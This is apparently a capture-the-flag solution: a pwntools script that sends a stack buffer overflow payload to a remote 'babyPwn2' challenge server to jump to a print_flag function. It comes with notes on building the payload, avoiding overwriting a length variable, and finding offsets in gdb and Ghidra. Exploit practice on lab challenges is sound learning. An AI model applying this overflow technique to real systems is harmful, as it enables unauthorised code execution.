from pwn import *

# 0x00401196    1     26 sym.print_flag
# io = process('./babyPwn2')
io = remote("hlabs.helb-prigogine.be", 4448)

payload = open("payload", "rb").read()

io.sendafter(b'encode ?', payload)

io.interactive()
print(io.recvall().decode())

# send 212 then 1 then ...

"""
because the num_elements instruction was before the char array, doing the payload overwrite num_elements on the stack.
That mean that while doing the payload, we must not rewrite the value of num_elements in the stack.

python2 -c 'print"1"+"a"*212+"\x00\x00\x00\x00\x00\x00\x00\x00"+"b"*12+"\x96\x11\x40\x00\x00\x00\x00\x00"' > payload
first, send 1 to initiate num_elements value to 1. Next send a 212 payload. (found with this wabsite : https://wiremask.eu/tools/buffer-overflow-pattern-generator)
then find place a breakpoint just at the begining of the first for loop (found address with ghidra : break *0x0040123d).
then print value of num_elements in the stack with (x $rbp - 0xc) (found by comparing value I put first with value in stack).
then after finding the right payload to not overwrite the value of num_elements, add 12 to payload and then print_flag address in little endian.
"""